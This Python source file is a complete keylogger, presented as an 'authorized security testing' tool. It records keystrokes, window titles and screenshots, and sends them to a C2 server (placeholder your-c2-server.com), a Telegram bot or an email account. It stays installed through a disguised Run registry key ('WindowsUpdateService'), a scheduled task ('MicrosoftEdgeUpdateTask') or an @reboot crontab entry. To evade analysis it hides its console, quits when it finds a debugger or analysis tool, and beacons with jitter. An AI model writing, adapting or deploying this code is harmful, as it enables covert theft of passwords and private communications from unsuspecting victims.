#!/usr/bin/env python3
"""
Advanced Keylogger with Multi-Channel Exfiltration
For authorized security testing and research only
Version: 2.0.0
"""

import os
import sys
import time
import json
import base64
import threading
import queue
import platform
import subprocess
import hashlib
from datetime import datetime
from typing import Dict, List, Optional, Any
import warnings
warnings.filterwarnings("ignore")

# ==================== DEPENDENCY CHECK ====================

def check_dependencies():
    """Check and install required dependencies"""
    required = ['pynput', 'requests', 'cryptography', 'psutil']
    missing = []
    
    for package in required:
        try:
            __import__(package)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[!] Missing dependencies: {missing}")
        print("[*] Installing...")
        for package in missing:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        print("[+] Dependencies installed")

check_dependencies()

# Now import after ensuring installation
from pynput.keyboard import Listener, Key
import requests
from cryptography.fernet import Fernet
import psutil

# ==================== CONFIGURATION ====================

CONFIG = {
    # Logging settings
    "log_file": "logs/keystrokes.log",
    "buffer_size": 50,  # Flush after this many keystrokes
    "flush_interval": 30,  # Or flush every 30 seconds
    
    # Exfiltration settings
    "exfil_enabled": True,
    "exfil_methods": ["https", "telegram", "email"],  # Order of priority
    
    # HTTPS C2 Settings
    "c2_endpoint": "https://your-c2-server.com/exfil",
    "c2_api_key": "your-api-key-here",
    
    # Telegram Settings
    "telegram_bot_token": "",
    "telegram_chat_id": "",
    
    # Email Settings
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "email_username": "",
    "email_password": "",
    "email_recipient": "",
    
    # Encryption
    "encryption_key_file": ".keylog_key",
    
    # Stealth Settings
    "hide_console": True,
    "anti_debug": True,
    "persistence": True,
    
    # Beacon Settings
    "beacon_enabled": True,
    "beacon_interval": 60,  # seconds
    "beacon_jitter": 10,    # random +/- seconds
}

# ==================== ENCRYPTION MODULE ====================

class EncryptionManager:
    """Handles encryption of captured data"""
    
    def __init__(self):
        self.key_file = os.path.expanduser(f"~/{CONFIG['encryption_key_file']}")
        self.key = self._load_or_create_key()
        self.cipher = Fernet(self.key)
    
    def _load_or_create_key(self) -> bytes:
        """Load existing key or generate new one"""
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            # Hide the key file
            if platform.system() == "Windows":
                subprocess.run(['attrib', '+h', self.key_file], capture_output=True)
            return key
    
    def encrypt(self, data: str) -> str:
        """Encrypt string data"""
        encrypted = self.cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, encrypted_data: str) -> str:
        """Decrypt string data"""
        decoded = base64.b64decode(encrypted_data.encode())
        return self.cipher.decrypt(decoded).decode()

# ==================== EXFILTRATION MODULE ====================

class ExfiltrationManager:
    """Manages data exfiltration through multiple channels"""
    
    def __init__(self, encryption: EncryptionManager):
        self.encryption = encryption
        self.queue = queue.Queue()
        self.running = False
        self.worker_thread = None
        
    def start(self):
        """Start exfiltration worker"""
        self.running = True
        self.worker_thread = threading.Thread(target=self._worker)
        self.worker_thread.daemon = True
        self.worker_thread.start()
    
    def stop(self):
        """Stop exfiltration"""
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=5)
    
    def add(self, data: Dict):
        """Add data to exfiltration queue"""
        self.queue.put(data)
    
    def _worker(self):
        """Background worker for exfiltration"""
        while self.running:
            try:
                data = self.queue.get(timeout=5)
                
                # Try each exfiltration method
                for method in CONFIG['exfil_methods']:
                    if method == "https" and self._exfil_https(data):
                        break
                    elif method == "telegram" and self._exfil_telegram(data):
                        break
                    elif method == "email" and self._exfil_email(data):
                        break
                    elif method == "file" and self._exfil_file(data):
                        break
                else:
                    # All methods failed, save locally
                    self._save_failed(data)
                    
            except queue.Empty:
                continue
            except Exception as e:
                print(f"Exfil error: {e}")
    
    def _exfil_https(self, data: Dict) -> bool:
        """Exfiltrate via HTTPS POST"""
        if not CONFIG['c2_endpoint']:
            return False
        
        try:
            encrypted = self.encryption.encrypt(json.dumps(data))
            response = requests.post(
                CONFIG['c2_endpoint'],
                json={"data": encrypted},
                headers={"X-API-Key": CONFIG['c2_api_key']},
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def _exfil_telegram(self, data: Dict) -> bool:
        """Exfiltrate via Telegram Bot"""
        if not CONFIG['telegram_bot_token'] or not CONFIG['telegram_chat_id']:
            return False
        
        try:
            # Prepare message
            message = f"📊 Keylogger Report\n"
            message += f"Time: {data.get('timestamp', 'N/A')}\n"
            message += f"Keys: {data.get('keys', '')[:500]}\n"
            message += f"Window: {data.get('window', 'N/A')}"
            
            url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendMessage"
            response = requests.post(url, json={
                "chat_id": CONFIG['telegram_chat_id'],
                "text": message,
                "parse_mode": "HTML"
            }, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def _exfil_email(self, data: Dict) -> bool:
        """Exfiltrate via Email"""
        if not CONFIG['email_username'] or not CONFIG['email_password']:
            return False
        
        try:
            import smtplib
            from email.mime.text import MIMEText
            
            msg = MIMEText(json.dumps(data, indent=2))
            msg['Subject'] = f"Keylog Data - {datetime.now().isoformat()}"
            msg['From'] = CONFIG['email_username']
            msg['To'] = CONFIG['email_recipient']
            
            server = smtplib.SMTP(CONFIG['smtp_server'], CONFIG['smtp_port'])
            server.starttls()
            server.login(CONFIG['email_username'], CONFIG['email_password'])
            server.send_message(msg)
            server.quit()
            return True
        except:
            return False
    
    def _exfil_file(self, data: Dict) -> bool:
        """Save to local file (fallback)"""
        try:
            with open(CONFIG['log_file'].replace('.log', '_exfil.log'), 'a') as f:
                f.write(json.dumps(data) + '\n')
            return True
        except:
            return False
    
    def _save_failed(self, data: Dict):
        """Save failed exfiltration attempts"""
        try:
            with open("logs/failed_exfil.json", "a") as f:
                f.write(json.dumps(data) + '\n')
        except:
            pass

# ==================== WINDOW TRACKING ====================

class WindowTracker:
    """Tracks active window information"""
    
    def __init__(self):
        self.current_window = None
        self.current_process = None
        
    def get_active_window(self) -> tuple:
        """Get current active window title and process"""
        try:
            if platform.system() == "Windows":
                import win32gui
                import win32process
                import psutil
                
                hwnd = win32gui.GetForegroundWindow()
                window_title = win32gui.GetWindowText(hwnd)
                
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                process = psutil.Process(pid)
                process_name = process.name()
                
                return window_title, process_name
            else:
                # Linux/macOS fallback
                import subprocess
                result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], 
                                      capture_output=True, text=True)
                return result.stdout.strip(), "unknown"
        except:
            return "Unknown", "Unknown"
    
    def has_changed(self) -> bool:
        """Check if active window has changed"""
        window, process = self.get_active_window()
        changed = (window != self.current_window)
        if changed:
            self.current_window = window
            self.current_process = process
        return changed

# ==================== MAIN KEYLOGGER ====================

class AdvancedKeylogger:
    """Main keylogger class with advanced features"""
    
    def __init__(self):
        self.log_buffer = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.listener = None
        self.exfil_manager = None
        self.encryption = EncryptionManager()
        self.window_tracker = WindowTracker()
        self.last_flush = time.time()
        
        # Create logs directory
        os.makedirs("logs", exist_ok=True)
        
        # Special key mapping
        self.special_keys = {
            Key.space: " ",
            Key.enter: "\n",
            Key.tab: "\t",
            Key.backspace: "[BACKSPACE]",
            Key.delete: "[DEL]",
            Key.esc: "[ESC]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
            Key.shift: "[SHIFT]",
            Key.shift_r: "[SHIFT]",
            Key.ctrl_l: "[CTRL]",
            Key.ctrl_r: "[CTRL]",
            Key.alt_l: "[ALT]",
            Key.alt_r: "[ALT]",
            Key.cmd: "[WIN]",
            Key.f1: "[F1]", Key.f2: "[F2]", Key.f3: "[F3]",
            Key.f4: "[F4]", Key.f5: "[F5]", Key.f6: "[F6]",
            Key.f7: "[F7]", Key.f8: "[F8]", Key.f9: "[F9]",
            Key.f10: "[F10]", Key.f11: "[F11]", Key.f12: "[F12]",
        }
        
        # Key count tracking
        self.key_count = 0
        self.start_time = datetime.now()
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            # Check for window change
            if self.window_tracker.has_changed():
                window_entry = f"\n\n[WINDOW: {self.window_tracker.current_window} - {self.window_tracker.current_process}]\n"
                self.log_buffer.append(window_entry)
            
            # Convert key to readable format
            if hasattr(key, 'char') and key.char is not None:
                # Regular character
                key_str = key.char
            else:
                # Special key
                key_str = self.special_keys.get(key, f"[{key}]")
            
            # Add to buffer
            self.log_buffer.append(key_str)
            self.key_count += 1
            
            # Check if buffer needs flushing
            with self.buffer_lock:
                if len(self.log_buffer) >= CONFIG['buffer_size']:
                    self.flush_buffer()
                elif time.time() - self.last_flush >= CONFIG['flush_interval']:
                    self.flush_buffer()
            
        except Exception as e:
            print(f"Error processing key: {e}")
    
    def on_release(self, key):
        """Handle key release - check for stop condition"""
        # Stop on ESC key (for testing)
        if key == Key.esc and not CONFIG.get('production_mode', False):
            self.stop()
            return False
        return True
    
    def flush_buffer(self):
        """Write buffer to log file and optionally exfiltrate"""
        with self.buffer_lock:
            if not self.log_buffer:
                return
            
            log_text = ''.join(self.log_buffer)
            timestamp = datetime.now().isoformat()
            
            # Create log entry
            log_entry = {
                "timestamp": timestamp,
                "keys": log_text,
                "window": self.window_tracker.current_window,
                "process": self.window_tracker.current_process,
                "key_count": len(self.log_buffer),
                "total_keys": self.key_count
            }
            
            # Write to local file
            try:
                with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
                    f.write(f"\n[{timestamp}]\n{log_text}\n")
            except Exception as e:
                print(f"Write error: {e}")
            
            # Exfiltrate if enabled
            if CONFIG['exfil_enabled'] and self.exfil_manager:
                self.exfil_manager.add(log_entry)
            
            # Clear buffer
            self.log_buffer = []
            self.last_flush = time.time()
    
    def take_screenshot(self):
        """Take a screenshot (optional feature)"""
        try:
            import pyautogui
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"logs/screenshot_{timestamp}.png"
            pyautogui.screenshot(filename)
            
            # Exfil screenshot if configured
            if CONFIG['exfil_enabled']:
                with open(filename, 'rb') as f:
                    screenshot_b64 = base64.b64encode(f.read()).decode()
                
                self.exfil_manager.add({
                    "type": "screenshot",
                    "timestamp": timestamp,
                    "data": screenshot_b64[:1000]  # Truncate for demo
                })
            
            return filename
        except ImportError:
            return None
        except Exception as e:
            print(f"Screenshot error: {e}")
            return None
    
    def add_persistence(self):
        """Add persistence mechanisms"""
        if not CONFIG['persistence']:
            return
        
        try:
            if platform.system() == "Windows":
                import winreg
                
                # Registry persistence
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path,
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(
                    key,
                    "WindowsUpdateService",
                    0,
                    winreg.REG_SZ,
                    sys.executable + " " + os.path.abspath(__file__)
                )
                winreg.CloseKey(key)
                
                # Scheduled task persistence
                task_name = "MicrosoftEdgeUpdateTask"
                cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {os.path.abspath(__file__)}" /sc onlogon /f'
                subprocess.run(cmd, shell=True, capture_output=True)
                
                print("[+] Persistence established")
            else:
                # Linux/macOS crontab
                cron_line = f"@reboot {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
                print("[+] Crontab persistence added")
        except Exception as e:
            print(f"Persistence error: {e}")
    
    def anti_debug(self):
        """Anti-debugging measures"""
        if not CONFIG['anti_debug']:
            return True
        
        # Check for debugger
        if sys.gettrace() is not None:
            print("Debugger detected! Exiting...")
            sys.exit(0)
        
        # Check for analysis tools (Windows)
        if platform.system() == "Windows":
            analysis_tools = [
                "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", 
                "ida.exe", "ida64.exe", "windbg.exe",
                "procexp.exe", "procmon.exe", "wireshark.exe"
            ]
            
            for tool in analysis_tools:
                try:
                    result = subprocess.run(f'tasklist /FI "IMAGENAME eq {tool}"', 
                                          shell=True, capture_output=True, text=True)
                    if tool.lower() in result.stdout.lower():
                        print(f"Analysis tool detected: {tool}")
                        sys.exit(0)
                except:
                    pass
        
        return True
    
    def hide_console(self):
        """Hide console window on Windows"""
        if not CONFIG['hide_console']:
            return
        
        if platform.system() == "Windows":
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
    
    def beacon_loop(self):
        """Background beacon for C2 communication"""
        if not CONFIG['beacon_enabled']:
            return
        
        while self.running:
            try:
                # Add jitter to avoid detection
                import random
                sleep_time = CONFIG['beacon_interval'] + random.randint(0, CONFIG['beacon_jitter'])
                time.sleep(sleep_time)
                
                # Collect system info
                beacon_data = {
                    "type": "beacon",
                    "agent_id": socket.gethostname(),
                    "timestamp": datetime.now().isoformat(),
                    "status": "active",
                    "key_count": self.key_count,
                    "uptime": str(datetime.now() - self.start_time)
                }
                
                # Send beacon via exfiltration
                if self.exfil_manager:
                    self.exfil_manager.add(beacon_data)
                    
            except Exception as e:
                print(f"Beacon error: {e}")
    
    def start(self):
        """Start the keylogger"""
        print("[*] Starting Advanced Keylogger...")
        
        # Anti-debugging
        if not self.anti_debug():
            return
        
        # Hide console
        self.hide_console()
        
        # Initialize exfiltration
        if CONFIG['exfil_enabled']:
            self.exfil_manager = ExfiltrationManager(self.encryption)
            self.exfil_manager.start()
        
        # Add persistence
        self.add_persistence()
        
        # Start beacon thread
        self.running = True
        beacon_thread = threading.Thread(target=self.beacon_loop)
        beacon_thread.daemon = True
        beacon_thread.start()
        
        # Start keyboard listener
        print("[+] Keylogger running. Press ESC to stop (testing mode)...")
        
        with Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            self.listener.join()
    
    def stop(self):
        """Stop the keylogger"""
        print("\n[*] Stopping keylogger...")
        self.running = False
        self.flush_buffer()
        
        if self.exfil_manager:
            self.exfil_manager.stop()
        
        if self.listener:
            self.listener.stop()
        
        print("[+] Keylogger stopped")
        print(f"[*] Total keys captured: {self.key_count}")
        print(f"[*] Log file: {CONFIG['log_file']}")

# ==================== COMMAND LINE INTERFACE ====================

def show_banner():
    """Display banner"""
    banner = f"""
╔══════════════════════════════════════════════════════════╗
║     🛡️  Advanced Keylogger v2.0 - Security Testing      ║
║     ⚠️  FOR AUTHORIZED USE ONLY                         ║
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

def configure_from_env():
    """Load configuration from environment variables"""
    import os
    
    # Check for environment variables
    env_mappings = {
        'TELEGRAM_BOT_TOKEN': 'telegram_bot_token',
        'TELEGRAM_CHAT_ID': 'telegram_chat_id',
        'C2_ENDPOINT': 'c2_endpoint',
        'C2_API_KEY': 'c2_api_key',
        'EMAIL_USERNAME': 'email_username',
        'EMAIL_PASSWORD': 'email_password',
        'EMAIL_RECIPIENT': 'email_recipient'
    }
    
    for env_var, config_key in env_mappings.items():
        if os.environ.get(env_var):
            CONFIG[config_key] = os.environ[env_var]

def interactive_config():
    """Interactive configuration for first run"""
    print("\n[*] First-time setup detected")
    print("[*] Configure exfiltration methods (press Enter to skip)\n")
    
    # Telegram setup
    print("📱 Telegram Bot Configuration:")
    token = input("  Bot Token (from @BotFather): ").strip()
    if token:
        CONFIG['telegram_bot_token'] = token
        CONFIG['telegram_chat_id'] = input("  Chat ID: ").strip()
        CONFIG['exfil_methods'].insert(0, "telegram")
    
    # Email setup
    print("\n📧 Email Configuration:")
    email = input("  Email address: ").strip()
    if email:
        CONFIG['email_username'] = email
        CONFIG['email_password'] = input("  Password/App Password: ").strip()
        CONFIG['email_recipient'] = input("  Recipient email: ").strip()
        CONFIG['exfil_methods'].insert(0, "email")
    
    # Save config
    with open('keylogger_config.json', 'w') as f:
        json.dump(CONFIG, f, indent=2)
    
    print("\n[+] Configuration saved to keylogger_config.json")
    print("[!] To change settings later, edit this file or set environment variables")

def load_config():
    """Load configuration from file"""
    config_file = 'keylogger_config.json'
    if os.path.exists(config_file):
        try:
            with open(config_file, 'r') as f:
                saved_config = json.load(f)
                CONFIG.update(saved_config)
            print("[+] Configuration loaded from file")
        except:
            pass

# ==================== MAIN ENTRY POINT ====================

def main():
    """Main function"""
    show_banner()
    
    # Load configuration
    load_config()
    configure_from_env()
    
    # Interactive setup if first run and no config
    if not os.path.exists('keylogger_config.json') and not any([
        CONFIG['telegram_bot_token'], 
        CONFIG['email_username'],
        CONFIG['c2_endpoint'] != "https://your-c2-server.com/exfil"
    ]):
        interactive_config()
    
    # Create and start keylogger
    keylogger = AdvancedKeylogger()
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()
    except Exception as e:
        print(f"[!] Error: {e}")
        keylogger.stop()
    
    print("\n[*] Goodbye!")

if __name__ == "__main__":
    # Import additional modules needed
    import socket
    
    # Production mode flag (disable ESC exit)
    if '--production' in sys.argv:
        CONFIG['production_mode'] = True
        print("[!] Running in PRODUCTION mode - ESC will NOT stop the keylogger")
    
    main()
